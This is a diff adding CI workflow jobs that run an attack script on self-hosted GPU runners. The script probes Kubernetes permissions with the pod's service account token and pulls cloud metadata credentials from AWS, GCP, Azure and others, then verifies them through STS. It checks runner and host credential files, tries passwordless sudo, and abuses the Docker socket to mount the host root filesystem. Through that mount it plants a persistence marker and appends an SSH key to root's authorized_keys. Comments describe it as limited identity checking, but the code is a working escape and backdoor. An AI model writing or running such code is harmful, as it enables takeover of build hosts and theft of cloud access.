+          st4,b4=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%pid)
+          print('PERSIST_LOG=%s' % (b4 or b'')[:2500].decode('utf-8','replace').replace('\n','|'))
+          # exec readback (fresh API session)
+          st5,b5=dreq('POST','/containers/%s/exec'%pid, {'AttachStdout':True,'AttachStderr':True,'Tty':True,'Cmd':['/bin/sh','-c','cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo EXEC_UID=$(id -u); echo EXEC_HOST=$(hostname); echo EXEC_PID1=$(cat /host/proc/1/comm 2>/dev/null)']})
+          eid=None
+          try: eid=json.loads(b5).get('Id')
+          except Exception: pass
+          print('PERSIST_EXEC_CREATE_HTTP=%d eid=%s' % (st5, (eid or '')[:16]))
+          if eid:
+              st6,b6=dreq('POST','/exec/%s/start'%eid, {'Detach':False,'Tty':True}, timeout=20)
+              print('PERSIST_EXEC_HTTP=%d OUT=%s' % (st6, (b6 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # second-container independent readback
+          st7,b7,extra=one_shot(chosen, 'cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo RB_UID=$(id -u); echo RB_PID1=$(cat /host/proc/1/comm 2>/dev/null)', binds=['/:/host:ro'], net='none', suffix='rb')
+          print('PERSIST_RB_HTTP=%d OUT=%s' % (st7, (b7 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # dual-use: install an SSH key into host root authorized_keys and test over SSH
+          st_key, out_key = -1, b''
+          import shutil, subprocess
+          have_sshgen = shutil.which('ssh-keygen') is not None
+          have_ssh = shutil.which('ssh') is not None
+          print('SSH_TOOLS ssh-keygen=%s ssh=%s' % (have_sshgen, have_ssh))
+          if have_sshgen and have_ssh:
+              try:
+                  subprocess.run(['ssh-keygen','-t','ed25519','-N','','-f','/tmp/c211_i126825_key','-C','c211-i126825-'+N], capture_output=True, timeout=20)
+                  pub=open('/tmp/c211_i126825_key.pub').read().strip()
+                  print('SSH_PUB_FP=%s' % ' '.join(pub.split()[:2])[:120])
+                  inst = 'mkdir -p /host/root/.ssh; chmod 700 /host/root/.ssh; touch /host/root/.ssh/authorized_keys; grep -q \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys || echo \"'+pub+'\" >> /host/root/.ssh/authorized_keys; chmod 600 /host/root/.ssh/authorized_keys; echo SSHKEY_INSTALLED; grep -c \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys'
+                  st8,b8=one_shot(chosen, inst, binds=['/:/host:rw'], net='none', suffix='sshinst')
+                  print('SSHKEY_INSTALL_HTTP=%d OUT=%s' % (st8, (b8 or b'')[:400].decode('utf-8','replace').replace('\n','|')))
+              except Exception as e:
+                  print('SSHKEY_INSTALL_ERR=%s' % str(e)[:160])
+          st9,b9=dreq('GET','/containers/json?all=1')
+          try:
+              allc=json.loads(b9) if st9==200 else []
+          except Exception:
+              allc=[]
+          mine=[','.join(c.get('Names') or []) for c in allc if ('c211-'+N) in ','.join(c.get('Names') or [])]
+          print('CLEANUP_REMAIN=%s' % '|'.join(mine)[:600])
+          print('PERSIST_ATTEMPT_DONE nonce=%s' % N)
+          PY_DOCKER
+          
+          echo "C211P_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  mi355x8-ident:
+    runs-on: "linux-mi35x-gpu-8"
+    timeout-minutes: 20
+    steps:
+      - name: src02-persist-identity-mi355x8-ident
+        env:
+          NONCE: c211-i126825-77e350b54e0695aa
+          JOBTAG: mi355x8
+          PERSIST: "1"
+        run: |
+          set -u
+          set +e
+          export LC_ALL=C
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 30"; else TO=""; fi
+          echo "C211P_BEGIN job=$JOBTAG nonce=$NONCE persist=$PERSIST ts=$(ts)"
+          echo "C211P_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 | sed 's/^/ID /'
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PRODUCT_UUID=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null)"
+          echo "POD_HOSTNAME=$(hostname 2>/dev/null) POD_MACHINE_ID16=$(sha256sum /etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null) NONEWPRIVS=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status 2>/dev/null) SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status 2>/dev/null)"
+          echo "CGROUP1=$(head -2 /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+          echo "MOUNTINFO_DOCKER=$(grep -i -m4 docker /proc/self/mountinfo 2>/dev/null | tr '\n' '|' | head -c 900)"
+          
+          echo "--- GPU identity ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -20 | sed 's/^/NVIDIA_L /'
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total,serial --format=csv,noheader 2>&1 | head -20 | sed 's/^/NVIDIA_Q /'
+          else echo NVIDIA_SMI=absent; fi
+          if command -v rocm-smi >/dev/null 2>&1; then
+            $TO rocm-smi --showuniqueid --showproductname 2>&1 | head -160 | sed 's/^/ROCM_SMI /'
+          else echo ROCM_SMI=absent; fi
+          if command -v amd-smi >/dev/null 2>&1; then $TO amd-smi static --asic 2>&1 | head -120 | sed 's/^/AMD_SMI_ASIC /'; else echo AMD_SMI=absent; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -10 | sed 's/^/DEV /'
+          
+          echo "--- K8s identity + RBAC (token in memory, claims only) ---"
+          echo "K8S_HOST=$KUBERNETES_SERVICE_HOST K8S_PORT=$KUBERNETES_SERVICE_PORT"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SA/token") sha16=$(sha256sum "$SA/token" | cut -c1-16) namespace=$(cat "$SA/namespace" 2>/dev/null)"
+            python3 - <<'PY_K8S' 2>&1 | sed 's/^/K8SID /'
+          import os, ssl, json, base64, urllib.request, urllib.error
+          SA='/var/run/secrets/kubernetes.io/serviceaccount'
+          def r(p):
+              try: return open(p,'rb').read()
+              except Exception: return None
+          tokb=r(SA+'/token')
+          if not tokb:
+              print('TOKEN_GONE'); raise SystemExit(0)
+          tok=tokb.strip().decode()
+          def b64d(s):
+              s+='='*(-len(s)%4)
+              return base64.urlsafe_b64decode(s.encode())
+          try:
+              hdr=json.loads(b64d(tok.split('.')[0])); pl=json.loads(b64d(tok.split('.')[1]))
+              print('JWT_ALG=%s KID=%s' % (hdr.get('alg'), hdr.get('kid')))
+              for k in ('iss','aud','sub','exp','iat','nbf'):
+                  if k in pl: print('JWT_%s=%s' % (k.upper(), json.dumps(pl[k])[:320]))
+              ku=pl.get('kubernetes.io') or {}
+              print('JWT_K8S_NS=%s SA_NAME=%s SA_UID=%s POD_NAME=%s NODE_NAME=%s' % (ku.get('namespace'), (ku.get('serviceaccount') or {}).get('name'), (ku.get('serviceaccount') or {}).get('uid'), (ku.get('pod') or {}).get('name'), (ku.get('node') or {}).get('name')))
+          except Exception as e:
+              print('JWT_DECODE_ERR', str(e)[:120])
+          host=os.environ.get('KUBERNETES_SERVICE_HOST',''); port=os.environ.get('KUBERNETES_SERVICE_PORT','443') or '443'
+          if not host:
+              print('NO_K8S_HOST'); raise SystemExit(0)
+          ca=SA+'/ca.crt'
+          ctx=ssl.create_default_context(cafile=ca) if os.path.isfile(ca) else ssl._create_unverified_context()
+          def kreq(method, path, body=None, timeout=8):
+              data=json.dumps(body).encode() if body is not None else None
+              req=urllib.request.Request('https://%s:%s%s'%(host,port,path), data=data, method=method,
+                  headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json','Accept':'application/json'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  return resp.status, resp.read()[:4000]
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:600]
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:140]).encode()
+          st,b=kreq('GET','/version')
+          print('VERSION_HTTP=%d' % st)
+          if st==200:
+              try: print('VERSION=%s' % json.loads(b).get('gitVersion'))
+              except Exception: pass
+          st,b=kreq('POST','/apis/authentication.k8s.io/v1/selfsubjectreviews',{'apiVersion':'authentication.k8s.io/v1','kind':'SelfSubjectReview'})
+          print('SSREVIEW_HTTP=%d' % st)
+          try:
+              u=json.loads(b).get('status',{}).get('userInfo',{})
+              print('USERNAME=%s UID=%s GROUPS=%s' % (u.get('username'), u.get('uid'), ','.join(u.get('groups') or [])[:300]))
+          except Exception:
+              print('SSREVIEW_BODY=%s' % b[:200].decode('utf-8','replace').replace('\n',' '))
+          ns=(r(SA+'/namespace') or b'').decode().strip()
+          for nsx in ('', ns):
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',{'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':nsx}})
+              print('SSRR_NS=%r HTTP=%d' % (nsx, st))
+              if st in (200,201):
+                  try:
+                      rules=(json.loads(b).get('status') or {}).get('resourceRules') or []
+                      print('SSRR_RULES=%d' % len(rules))
+                      for i,rr in enumerate(rules[:10]):
+                          print('SSRR_RULE_%d verbs=%s resources=%s' % (i, ','.join(rr.get('verbs') or []), ','.join(rr.get('resources') or [])))
+                  except Exception as e: print('SSRR_PARSE_ERR', str(e)[:80])
+          for verb,res,n in [('create','secrets',ns),('create','pods',ns),('list','secrets',''),('get','nodes',''),('create','serviceaccounts/token',ns),('create','clusterrolebindings',''),('list','pods',ns)]:
+              body={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':verb,'resource':res,'namespace':n}}}
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',body)
+              allowed=None; reason=''
+              if st in (200,201):
+                  try:
+                      s=json.loads(b).get('status') or {}; allowed=s.get('allowed'); reason=s.get('reason') or ''
+                  except Exception: pass
+              print('SSAR %s %s ns=%r HTTP=%d allowed=%s reason=%s' % (verb,res,n,st,allowed,(reason or '')[:90]))
+          for path in ['/api/v1/namespaces/%s/pods'%ns, '/api/v1/namespaces/%s/secrets'%ns, '/api/v1/nodes', '/apis/actions.github.com/v1alpha1/namespaces/%s/autoscalingrunnersets'%ns]:
+              st,b=kreq('GET',path)
+              extra=''
+              if st==200:
+                  try: extra=' items=%d' % len((json.loads(b).get('items') or []))
+                  except Exception: pass
+              print('GET %s HTTP=%d%s' % (path, st, extra))
+          PY_K8S
+          else echo SA_TOKEN_ABSENT; fi
+          
+          echo "--- IMDS / cloud metadata (pod netns) ---"
+          python3 - <<'PY_IMDS' 2>&1 | sed 's/^/IMDS /'
+          import json, hashlib, urllib.request, urllib.error, datetime, hmac, re
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def q(url, headers=None, method='GET', data=None, timeout=2):
+              req=urllib.request.Request(url, data=data, method=method, headers=headers or {})
+              try:
+                  r=urllib.request.urlopen(req, timeout=timeout); return r.status, r.read()[:3000].decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read()[:300].decode('utf-8','replace')
+              except Exception as e: return -1, (type(e).__name__+':'+str(e)[:90])
+          def sts(ak,sk,tok,region='us-east-1'):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(req,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
+              except Exception as e: return -1, str(e)[:200]
+          s,t=q('http://169.254.169.254/latest/api/token', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}, method='PUT', data=b'')
+          print('AWS_TOKEN_HTTP=%d' % s)
+          if s==200:
+              H={'X-aws-ec2-metadata-token': t}
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info','meta-data/iam/security-credentials/'):
+                  s2,t2=q('http://169.254.169.254/latest/'+p, headers=H)
+                  print('AWS %s HTTP=%d VAL=%s' % (p, s2, (t2 or '').replace('\n',' ')[:240]))
+              role=(t2 or '').strip().splitlines()[0] if s==200 and t2 else ''
+              if role and not role.startswith('-1'):
+                  s3,cb=q('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=H)
+                  try:
+                      d=json.loads(cb)
+                      print('AWS_CRED_FIELDS akid_fp=%s sec_fp=%s token_fp=%s exp=%s code=%s' % (fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration'), d.get('Code')))
+                      s4,bb=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', bb); a=re.search(r'<Account>([^<]+)</Account>', bb)
+                      print('AWS_STS status=%s arn=%s account=%s' % (s4, (m.group(1) if m else None), (a.group(1) if a else None)))
+                  except Exception as e:
+                      print('AWS_CRED_PARSE_FAIL %s %s' % (str(e)[:100], (cb or '')[:160]))
+          for base in ('http://169.254.169.254','http://metadata.google.internal'):
+              s,t=q(base+'/computeMetadata/v1/instance/id', headers={'Metadata-Flavor':'Google'})
+              print('GCP %s HTTP=%d VAL=%s' % (base, s, (t or '')[:90].replace('\n',' ')))
+              if s==200:
+                  for p in ('project/project-id','instance/zone','instance/service-accounts/default/?recursive=true'):
+                      s2,t2=q(base+'/computeMetadata/v1/'+p, headers={'Metadata-Flavor':'Google'})
+                      print('GCP %s HTTP=%d VAL=%s' % (p, s2, (t2 or '')[:200].replace('\n',' ')))
+                  s3,t3=q(base+'/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})
+                  try:
+                      d=json.loads(t3); print('GCP_TOKEN_HTTP=%d scopes=%s expires=%s' % (s3, (d.get('scope') or '')[:200], d.get('expires_in')))
+                  except Exception: print('GCP_TOKEN_HTTP=%d nonjson=%s' % (s3, (t3 or '')[:100]))
+                  break
+          s,t=q('http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers={'Metadata':'true'})
+          print('AZURE_HTTP=%d' % s)
+          if s==200:
+              try:
+                  d=json.loads(t); c=d.get('compute') or {}
+                  print('AZURE vmId=%s name=%s location=%s resourceGroup=%s subscriptionId=%s' % (c.get('vmId'), c.get('name'), c.get('location'), c.get('resourceGroupName'), (d.get('network') or {}).get('interface')))
+              except Exception: print('AZURE_BODY=%s' % (t or '')[:200])
+          for p in ('latest/meta-data/instance-id','latest/meta-data/region-id','latest/meta-data/ram/security-credentials/'):
+              s,t=q('http://100.100.100.200/'+p)
+              print('ALIYUN %s HTTP=%d VAL=%s' % (p, s, (t or '').replace('\n',' ')[:200]))
+          s,t=q('http://169.254.169.254/openstack/latest/meta_data.json')
+          print('OPENSTACK_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/opc/v2/instance/', headers={'Authorization':'Bearer Oracle'})
+          print('ORACLE_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/latest/meta-data/')
+          print('AWS_ROOT_HTTP=%d VAL=%s' % (s, (t or '')[:120].replace('\n',' ')))
+          PY_IMDS
+          
+          echo "--- IRSA / ECS task-role identity (claims + STS presence, no raw secrets) ---"
+          python3 - <<'PY_IRSA' 2>&1 | sed 's/^/IRSA /'
+          import os, json, base64, urllib.request, urllib.parse, hashlib
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def b64d(s):
+              s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s.encode())
+          tf=os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE'); arn=os.environ.get('AWS_ROLE_ARN'); sess=os.environ.get('AWS_ROLE_SESSION_NAME')
+          print('IRSA_ENV token_file=%s role_arn=%s session=%s' % (tf, arn, (sess or '')[:40]))
+          if tf and os.path.isfile(tf):
+              tok=open(tf).read().strip()
+              print('IRSA_TOKEN bytes=%d sha16=%s' % (len(tok), fp(tok)))
+              try:
+                  pl=json.loads(b64d(tok.split('.')[1]))
+                  print('IRSA_CLAIMS iss=%s aud=%s sub=%s exp=%s' % (pl.get('iss'),str(pl.get('aud'))[:60],str(pl.get('sub'))[:80],pl.get('exp')))
+              except Exception as e: print('IRSA_CLAIMS_ERR', str(e)[:80])
+              if arn:
+                  body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i126825','WebIdentityToken':tok}).encode()
+                  try:
+                      r=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,method='POST'),timeout=8)
+                      x=r.read().decode('utf-8','replace'); print('IRSA_STS_HTTP=%d has_creds=%s' % (r.status, '<Credentials>' in x))
+                  except Exception as e: print('IRSA_STS_ERR', str(e)[:100])
+          uri=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'); full=os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI'); auth=os.environ.get('AWS_CONTAINER_AUTHORIZATION_TOKEN')
+          print('ECS_ENV rel=%s full=%s authtok=%s' % (uri, full, 'set' if auth else 'none'))
+          urls=([ 'http://169.254.170.2'+uri ] if uri else []) + ([full] if full else ['http://169.254.170.2/v2/credentials'])
+          for u in urls:
+              try:
+                  h={'Authorization':auth} if auth else {}
+                  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=2); d=json.loads(r.read())
+                  print('ECS_CRED_HTTP=%d fields akid_fp=%s sec_fp=%s token_fp=%s exp=%s' % (r.status, fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration')))
+              except Exception as e: print('ECS_CRED_ERR %s %s' % (u[:60], str(e)[:80]))
+          PY_IRSA
+          
+          echo "--- runner env names + token files ---"
+          env | grep -E '^(AWS|GOOGLE|GCP|AZURE|ARM|KUBERNETES|RUNNER|ACTIONS|GITHUB)_' | sed 's/=.*$/=<set>/' | sort | head -60 | sed 's/^/ENVNAME /'
+          for p in "$HOME/actions-runner/.runner" "$HOME/actions-runner/.credentials" "$HOME/actions-runner/.credentials_rsaparams" "$HOME/actions-runner/.env" "$HOME/actions-runner/.path" "$HOME/.docker/config.json" "$HOME/.aws/credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.kube/config" "$HOME/.config/gh/hosts.yml" /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /home/runner/actions-runner/.path /home/runner/.docker/config.json /home/runner/.aws/credentials /home/runner/.config/gcloud/application_default_credentials.json /home/runner/.kube/config /home/runner/.config/gh/hosts.yml /home/runner/.netrc /home/runner/.git-credentials; do
+            if [ -e "$p" ]; then echo "RFILE=$p PRESENT bytes=$(wc -c < "$p" 2>/dev/null) sha16=$(sha256sum "$p" 2>/dev/null | cut -c1-16) readable=$([ -r "$p" ] && echo 1 || echo 0)"; else echo "RFILE=$p ABSENT"; fi
+          done
+          ls -la /home/runner/actions-runner 2>/dev/null | head -30 | sed 's/^/RDIR /'
+          SUDO_OK=0
+          if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then SUDO_OK=1; fi
+          echo "SUDO_NOPASSWD=$SUDO_OK"
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 25 sudo -n bash -c 'echo SUDO_UID=$(id -u); for p in /root/.ssh/authorized_keys /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /var/lib/kubelet/kubeconfig; do if [ -e "$p" ]; then echo "SUDOFILE=$p PRESENT bytes=$(wc -c < "$p") sha16=$(sha256sum "$p"|cut -c1-16)"; else echo "SUDOFILE=$p ABSENT"; fi; done' 2>&1 | sed 's/^/SUDO_/'
+          fi
+          
+          echo "--- docker daemon + persistence attempt (PERSIST=$PERSIST) ---"
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) WRITABLE=$([ -w /var/run/docker.sock ] && echo 1 || echo 0) GROUP=$(stat -c %G /var/run/docker.sock 2>/dev/null) MODE=$(stat -c %a /var/run/docker.sock 2>/dev/null)"
+          PU="python3"
+          if [ -S /var/run/docker.sock ] && [ ! -w /var/run/docker.sock ]; then
+            if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then PU="sudo -n env NONCE=$NONCE JOBTAG=$JOBTAG PERSIST=$PERSIST python3"; echo DOCKER_PY_VIA=sudo; fi
+          fi
+          echo "HOME=$HOME PWD=$PWD"
+          $PU - <<'PY_DOCKER' 2>&1 | sed 's/^/DOCKER /' 
+          import os, json, socket, http.client, time
+          N=os.environ.get('NONCE',''); TAG=os.environ.get('JOBTAG',''); PERSIST=os.environ.get('PERSIST','0')=='1'
+          DS='/var/run/docker.sock'
+          class UDSC(http.client.HTTPConnection):
+              def __init__(self, path, timeout=25):
+                  super().__init__('localhost', timeout=timeout); self.upath=path
+              def connect(self):
+                  s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(self.timeout); s.connect(self.upath); self.sock=s
+          def dreq(method, path, body=None, timeout=25):
+              c=UDSC(DS, timeout)
+              data=json.dumps(body).encode() if body is not None else None
+              h={'Content-Type':'application/json'} if data else {}
+              try:
+                  c.request(method, path, body=data, headers=h)
+                  r=c.getresponse(); b=r.read(); return r.status, b
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:120]).encode()
+              finally:
+                  try: c.close()
+                  except Exception: pass
+          if not os.path.exists(DS):
+              print('SOCK=absent'); raise SystemExit(0)
+          print('SOCK=present writable=%s' % os.access(DS, os.W_OK))
+          st,b=dreq('GET','/version')
+          print('VERSION_HTTP=%d VAL=%s' % (st, b[:200].decode('utf-8','replace').replace('\n',' ')))
+          if st!=200:
+              print('NO_API'); raise SystemExit(0)
+          st,bi=dreq('GET','/info'); info=json.loads(bi) if st==200 else {}
+          keys=['Name','ServerVersion','KernelVersion','OperatingSystem','OSType','Architecture','NCPU','MemTotal','DockerRootDir','Containers','ContainersRunning','ContainersStopped','Images','Driver','CgroupDriver','CgroupVersion']
+          print('INFO=' + json.dumps({k: info.get(k) for k in keys}, sort_keys=True)[:1300])
+          st,bc=dreq('GET','/containers/json?all=1'); cont=json.loads(bc) if st==200 else []
+          pods={}; nss=set(); names=[]
+          for c in cont:
+              labs=c.get('Labels') or {}
+              p=labs.get('io.kubernetes.pod.name'); n=labs.get('io.kubernetes.pod.namespace')
+              if p: pods[p]=n
+              if n: nss.add(n)
+              names.append(','.join(c.get('Names') or [])[:80])
+          print('CONTAINERS=%d DISTINCT_K8S_PODS=%d NS=%s' % (len(cont), len(pods), ','.join(sorted(nss))[:200]))
+          print('CONTAINER_NAMES=%s' % '|'.join(names[:12])[:600])
+          st,bm=dreq('GET','/images/json'); imgs=json.loads(bm) if st==200 else []
+          print('IMAGES=%d' % len(imgs))
+          name=str(info.get('Name') or '')
+          if len(pods)>=2 or ('kube-system' in nss) or (len(nss)>=2): verdict='NODE_LEVEL'
+          elif pods: verdict='AMBIGUOUS_SINGLE_POD'
+          elif len(name)>=12 and all(ch in '0123456789abcdef' for ch in name.lower()): verdict='DIND_SIDECAR'
+          else: verdict='UNKNOWN'
+          print('VERDICT=%s INFO_NAME=%s' % (verdict, name[:64]))
+          if not PERSIST:
+              print('PERSIST=skip'); raise SystemExit(0)
+          pref=['python3','sglang','rocm','pytorch','ubuntu','debian','alpine','busybox','node','centos','rocky','fedora']
+          cands=[]
+          for im in imgs:
+              tags=im.get('RepoTags') or []
+              iid=im.get('Id') or ''
+              score=0
+              for t in tags:
+                  tl=t.lower()
+                  for i,p in enumerate(pref):
+                      if p in tl: score=max(score,100-i)
+              if iid: cands.append((score,iid,tags))
+          cands.sort(key=lambda x:(-x[0],x[1]))
+          print('CANDIDATES=%s' % '|'.join('%d:%s:%s'%(s,i[:24],','.join(t)[:50]) for s,i,t in cands[:6])[:700])
+          def one_shot(image, script, binds=None, net='none', tmo=25, suffix='one'):
+              cfg={'Image':image,'Entrypoint':['/bin/sh'],'Cmd':['-c',script],'Tty':True,
+                   'HostConfig':{'AutoRemove':False,'NetworkMode':net}}
+              if binds: cfg['HostConfig']['Binds']=binds
+              st,b=dreq('POST','/containers/create?name=c211-'+N+'-'+suffix, cfg)
+              if st not in (200,201):
+                  return st, b, None
+              try: cid=json.loads(b).get('Id')
+              except Exception: return st, b, None
+              st2,b2=dreq('POST','/containers/%s/start'%cid)
+              if st2 not in (200,204):
+                  dreq('DELETE','/containers/%s?force=1'%cid); return st2, b2, cid
+              time.sleep(2.5)
+              st3,b3=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%cid)
+              st4,b4=dreq('GET','/containers/%s/json'%cid)
+              dreq('DELETE','/containers/%s?force=1'%cid)
+              return st, b3, (cid, st4, b4)
+          chosen=None; chosen_out=b''
+          for score,iid,tags in cands[:4]:
+              st,out,extra=one_shot(iid, 'echo C211_SH_OK; id -u; command -v python3 >/dev/null 2>&1 && echo PY3=1 || echo PY3=0', suffix='tst')
+              print('TEST_IMG=%s score=%d HTTP=%d OUT=%s' % (iid[:24], score, st, (out or b'')[:300].decode('utf-8','replace').replace('\n','|')))
+              if st in (200,201) and b'C211_SH_OK' in (out or b''):
+                  chosen=iid; chosen_out=out; break
+          if not chosen:
+              print('PERSIST_IMG=NONE'); raise SystemExit(0)
+          print('PERSIST_IMG=%s' % chosen[:30])
+          inner = r"""N="__NONCE__"
+          echo "C211H_BEGIN nonce=$N"
+          echo "HOST_HOSTNAME=$(cat /host/etc/hostname 2>/dev/null)"
+          echo "HOST_MACHINE_ID16=$(sha256sum /host/etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "HOST_PID1=$(cat /host/proc/1/comm 2>/dev/null)"
+          echo "HOST_OSRELEASE=$(cat /host/proc/sys/kernel/osrelease 2>/dev/null)"
+          echo "HOST_UPTIME=$(cut -d. -f1 /host/proc/uptime 2>/dev/null)"
+          echo "HOST_TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo 1 || echo 0) wget=$(command -v wget >/dev/null 2>&1 && echo 1 || echo 0) python3=$(command -v python3 >/dev/null 2>&1 && echo 1 || echo 0) ssh=$(command -v ssh >/dev/null 2>&1 && echo 1 || echo 0) sshd=$(command -v sshd >/dev/null 2>&1 && echo 1 || echo 0)"
+          for f in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/var/lib/rancher/k3s/agent/client-kubelet.kubeconfig /host/var/lib/rancher/k3s/server/cred/admin.kubeconfig /host/var/lib/rancher/k3s/server/node-token /host/etc/rancher/rke2/rke2.yaml /host/etc/kubernetes/admin.conf /host/root/.ssh/authorized_keys /host/root/.aws/credentials /host/etc/kubernetes/pki/ca.crt; do
+            if [ -e "$f" ]; then echo "HOSTFILE=$f PRESENT bytes=$(wc -c < "$f" 2>/dev/null) sha16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"; else echo "HOSTFILE=$f ABSENT"; fi
+          done
+          for d in /host/var/lib/rancher/k3s /host/etc/kubernetes /host/var/lib/cloud /host/root/.aws /host/home; do
+            if [ -d "$d" ]; then echo "HOSTDIR=$d PRESENT files=$(find "$d" -maxdepth 2 -type f 2>/dev/null | wc -l)"; else echo "HOSTDIR=$d ABSENT"; fi
+          done
+          echo "HOST_IPV4=$(hostname -I 2>/dev/null)"
+          echo "HOST_MARKER_SET=$(printf '%s' \"$N\" > /host/root/.c211-__NONCE__-persist.txt 2>/dev/null; cat /host/root/.c211-__NONCE__-persist.txt 2>/dev/null)"
+          mkdir -p /host/root/.ssh 2>/dev/null; chmod 700 /host/root/.ssh 2>/dev/null
+          touch /host/root/.ssh/authorized_keys 2>/dev/null
